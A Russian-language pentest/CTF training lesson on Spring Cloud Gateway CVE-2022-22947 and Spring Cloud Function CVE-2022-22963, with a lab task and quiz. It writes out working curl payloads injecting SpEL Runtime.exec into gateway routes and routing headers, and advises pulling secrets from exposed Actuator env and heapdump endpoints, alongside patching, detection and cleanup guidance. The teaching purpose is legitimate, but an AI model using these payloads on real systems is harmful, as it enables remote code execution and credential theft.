---
id: web-spring-cloud-gateway
title: 'Spring Cloud Gateway: CVE-2022-22947 (SpEL RCE)'
category: web
parent: web-frameworks
difficulty: hard
order: 5
tags: [spring, spring-cloud-gateway, spel, actuator, cve-2022-22947, cve-2022-22963, rce]
prerequisites: [web-frameworks, web-spring-boot-actuator]
useful_for:
  - 'CTF Web категория'
  - 'Bug bounty'
  - 'Пентест веб-приложений'
estimated_minutes: 80
summary: 'Spring Cloud Gateway как цель: Actuator endpoint, инъекция SpEL через маршруты (CVE-2022-22947), RCE через refresh, и Spring Cloud Function SpEL (CVE-2022-22963).'
lab:
  kind: shell
  title: 'Практика: SpEL-инъекция через маршрут шлюза'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md, route.json]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Прочитай task.md: там адрес шлюза и Actuator на `/actuator/gateway/routes`.'
    - 'Создай маршрут с фильтром `AddResponseHeader`, в котором SpEL-выражение выполняет команду.'
    - 'Затем вызови `/actuator/gateway/refresh`, чтобы маршрут активировался.'
    - 'Обратись к маршруту — в заголовке ответа будет вывод команды с флагом; сохрани в found.txt и набери `check`.'
---

## Вопрос, с которого всё начинается

Перед микросервисами стоит API-шлюз на **Spring Cloud Gateway** — Java-приложение, которое маршрутизирует запросы и применяет фильтры. У него открыт **Actuator** — служебный эндпоинт управления. В 2022 году выяснилось, что через Actuator можно добавить маршрут с SpEL-выражением и выполнить код (CVE-2022-22947). Разберём цепочку.

## Что такое Spring Cloud Gateway и SpEL

**Spring Cloud Gateway** — шлюз для микросервисной архитектуры на Spring. Он принимает запрос, определяет маршрут и применяет к нему **фильтры** (добавить заголовок, переписать путь, ограничить). Фильтры описываются в конфигурации, и некоторые поля поддерживают **SpEL** — Spring Expression Language, язык выражений Java.

**SpEL** — это как формулы: ты пишешь выражение, Spring его вычисляет. Если выражение может вызывать методы Java (например, `Runtime.getRuntime().exec`), то инъекция SpEL = RCE. Именно это и случилось в CVE-2022-22947.

**Actuator** — набор служебных эндпоинтов Spring Boot под `/actuator/`. Эндпоинт `gateway` позволяет читать и **менять маршруты** на живом приложении. Если он открыт без аутентификации — беда.

## Наш пример: Spring Cloud Gateway 3.1.0

Цель — `http://gateway.target.example:8080`. Определяем продукт по Actuator:

```
$ curl -s http://gateway.target.example:8080/actuator
{"_links":{"self":...,"gateway":{"href":"http://gateway.target.example:8080/actuator/gateway","templated":true}}}
```

Наличие ссылки `gateway` — это Spring Cloud Gateway с открытым Actuator. Версию уточняем по `/actuator/info` или статике. Диапазон CVE-2022-22947: 3.1.0, 3.0.0–3.0.6.

## Шаг 1: прочитать маршруты

Смотрим текущие маршруты:

```
$ curl -s http://gateway.target.example:8080/actuator/gateway/routes | head -c 300
[{"route_id":"default","uri":"http://backend.internal","predicates":[...]}]
```

Actuator отвечает без логина — значит, можно и **создавать** маршруты.

## Шаг 2: добавить маршрут с SpEL

Создаём маршрут, у которого фильтр `AddResponseHeader` содержит SpEL, выполняющий команду:

```
$ curl -s -X POST http://gateway.target.example:8080/actuator/gateway/routes/hack \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "id":"hack",
    "filters":[{"name":"AddResponseHeader",
      "args":{"name":"Result","value":"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream().readAllBytes())}"}}],
    "uri":"http://example.com",
    "predicates":[{"name":"Path","args":{"_genkey_0":"/hack"}}]
  }'
```

`#{...}` — это SpEL-выражение. Оно вызывает `Runtime.exec("id")` и читает вывод.

## Шаг 3: активировать и выполнить

Маршрут нужно «обновить», чтобы он применился:

```
$ curl -s -X POST http://gateway.target.example:8080/actuator/gateway/refresh
```

Теперь обращаемся к маршруту:

```
$ curl -s -D - http://gateway.target.example:8080/hack -o /dev/null | grep -i result
Result: uid=0(root) gid=0(root) groups=0(root)
```

`uid=0` — RCE. Команда выполнилась от имени процесса шлюза.

## Шаг 4: CVE-2022-22963 — Spring Cloud Function

Соседняя уязвимость — **Spring Cloud Function** (CVE-2022-22963): SpEL-инъекция через заголовок `spring.cloud.function.routing-expression`. Если в приложении есть Spring Cloud Function, инъекция срабатывает через обычный запрос:

```
$ curl -s -X POST http://gateway.target.example:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")' \
  -d 'test'
```

Это ещё один способ достичь RCE через SpEL.

## Шаг 5: почему это класс «framework runtime RCE»

Обрати внимание: уязвимость не в коде приложения, а в **самом фреймворке**. Даже «чистое» приложение на уязвимой версии Spring Cloud Gateway уязвимо. Это и есть framework-runtime RCE: он срабатывает независимо от логики приложения. Поэтому версия фреймворка — критичная информация.

## Шаг 6: пост-эксплуатация

Из шлюза достают: список внутренних сервисов и их адреса (маршруты), конфиги Actuator (`/actuator/env` может отдавать переменные с секретами), креды к бэкендам. Шлюз видит всю внутреннюю топологию.

## Шаг 7: как не сломать шлюз

Шлюз на пути всего трафика: его падение означает недоступность всех сервисов за ним. Поэтому добавляй **один** временный маршрут с безобидной командой (`id`), фиксируй доказательство и удаляй маршрут:

```
$ curl -s -X DELETE http://gateway.target.example:8080/actuator/gateway/routes/hack
$ curl -s -X POST http://gateway.target.example:8080/actuator/gateway/refresh
```

Оставлять свой маршрут нельзя — это изменение прода.

## Что мы теперь знаем

- Spring Cloud Gateway — шлюз микросервисов с фильтрами и SpEL.
- Actuator (`/actuator/gateway`) позволяет менять маршруты.
- CVE-2022-22947 — SpEL-инъекция через маршрут → RCE.
- CVE-2022-22963 — SpEL через Spring Cloud Function.
- Это framework-runtime RCE — не зависит от кода приложения.

## Разбираем, почему SpEL в конфигурации так опасен

Spring-приложения активно используют SpEL для гибкости: выражения вычисляются в рантайме, что удобно для конфигурации. Но если выражение приходит из **внешнего источника** (маршрут, заголовок, параметр), атакующий получает возможность выполнить произвольный код Java. В SpEL доступен полный доступ к классам через `T(...)`: например, `T(java.lang.Runtime).getRuntime().exec(...)`.

Ключевой момент: SpEL-инъекция — это не «SQL-инъекция в конфиге», а полноценный RCE, потому что язык выражений имеет доступ к системе. Именно поэтому CVE-2022-22947 классифицируют как critical.

## Шаг 8: как найти версию и Actuator

Версия Spring Cloud Gateway видна по Actuator `/actuator/info`, по заголовкам или статике. Actuator включён, если `/actuator` отдаёт список ссылок. Особенно опасны эндпоинты `gateway`, `env`, `heapdump` — через `env` могут утечь переменные с секретами, через `heapdump` — содержимое памяти (токены, пароли). Проверяй их все.

## Шаг 9: что писать в отчёте

Отчёт фиксирует: версию фреймворка; CVE (22947 и/или 22963); тип (RCE); доказательство SpEL (вывод `id`); импакт (RCE на шлюзе = доступ ко всем сервисам за ним); рекомендацию (обновить Spring Cloud Gateway, закрыть Actuator от внешней сети, включить аутентификацию на Actuator). Подчеркни, что это framework-runtime RCE — патч версии обязателен.

## Шаг 10: защита и детект

Защита: обновить до 3.1.1+/3.0.7+; отключить/защитить Actuator (`management.endpoints.web.exposure.include` ограничить); не выставлять шлюз с Actuator в интернет. Детект: POST к `/actuator/gateway/routes`, вызовы `/actuator/gateway/refresh`, SpEL-строки `#{T(` в логах.

## Ошибки и антипаттерны

Первая — оставлять созданный маршрут: это изменение прода, шлюз может начать маршрутизировать не туда. Вторая — использовать разрушительную команду вместо `id`. Третья — не проверить `/actuator/env` и `/actuator/heapdump`: там часто уже лежат секреты, и RCE может не понадобиться.

## Итог по Spring Cloud Gateway

Шлюз микросервисов с открытым Actuator — это готовый RCE через SpEL. Порядок: Actuator → версия → CVE-2022-22947 → временный маршрут → доказательство → удаление маршрута. Ключевой вывод: framework-runtime RCE не зависит от кода приложения, поэтому версия фреймворка критична.

## Разбор реального сценария

Пентест микросервисов. Spring Cloud Gateway 3.1.0 на 8080 с открытым Actuator. Ты читаешь `/actuator/gateway/routes` — видишь маршруты к внутренним сервисам (auth, orders, payments). Через `/actuator/env` находишь переменные с паролем к базе. Добавляешь маршрут с SpEL, вызываешь `refresh`, обращаешься к маршруту — в заголовке `Result` вывод `id` от root. Удаляешь маршрут и делаешь `refresh`. Итог: RCE на шлюзе и доступ ко всем внутренним сервисам за ним. В отчёте — critical: framework-runtime RCE на периметре микросервисов.

## Практический чек-лист по Spring Cloud Gateway

Обнаружение: `/actuator` отдаёт ссылки, порт приложения. Версия: `/actuator/info` или статика. Проверка Actuator: доступны ли `gateway`, `env`, `heapdump`. CVE: CVE-2022-22947 (SpEL через маршрут), CVE-2022-22963 (SpEL через функцию). Проверка: создание маршрута с `#{T(...).exec("id")}` + refresh. Доказательство: вывод в заголовке. Очистка: удалить маршрут + refresh. Отчёт: версия, CVE, доказательство, импакт, рекомендация (патч + закрыть Actuator).

## Почему Actuator нужно закрывать

Actuator задуман для внутреннего мониторинга, но по умолчанию Spring Boot часто открывает его без аутентификации. Это опасно: `env` отдаёт переменные (секреты), `heapdump` — дамп памяти (токены), `gateway` — управление маршрутами, `loggers` — смену уровня логирования. Правило: Actuator должен быть доступен только из внутренней сети и защищён. При пентесте наличие открытого Actuator — это находка сама по себе, даже без RCE, потому что он отдаёт секреты.

## Квиз

Проверь себя.

```quiz
- question: "Что такое SpEL?"
  options:
    - "Язык разметки"
    - "Spring Expression Language — вычисляемые выражения Java"
    - "Протокол"
    - "База данных"
  answer: 1
  explanation: "Если выражение вызывает exec — это RCE."
- question: "Какой Actuator-эндпоинт позволяет менять маршруты?"
  options:
    - "/actuator/health"
    - "/actuator/gateway"
    - "/actuator/info"
    - "/actuator/loggers"
  answer: 1
  explanation: "Через него создают маршрут с SpEL."
- question: "В чём суть CVE-2022-22947?"
  options:
    - "XSS"
    - "SpEL-инъекция через маршрут шлюза → RCE"
    - "SQLi"
    - "CSRF"
  answer: 1
  explanation: "Фильтр с #{...} выполняет код."
- question: "Почему это framework-runtime RCE?"
  options:
    - "Из-за кода приложения"
    - "Уязвимость в самом фреймворке, не в коде приложения"
    - "Из-за БД"
    - "Из-за браузера"
  answer: 1
  explanation: "Срабатывает на любой уязвимой версии."
- question: "Что сделать после доказательства RCE?"
  options:
    - "Оставить маршрут"
    - "Удалить маршрут и сделать refresh"
    - "Перезагрузить шлюз"
    - "Ничего"
  answer: 1
  explanation: "Нельзя оставлять изменения на проде."
```

## Куда дальше

Дальше — другие фреймворки и их runtime-CVE. А пока запомни: **Spring Cloud Gateway = Actuator + SpEL → RCE; убирай за собой маршрут.**

## Где пригодится

- Пентест микросервисов и API-шлюзов.
- Red team: framework-runtime RCE.
- CTF: задания на SpEL и Actuator.
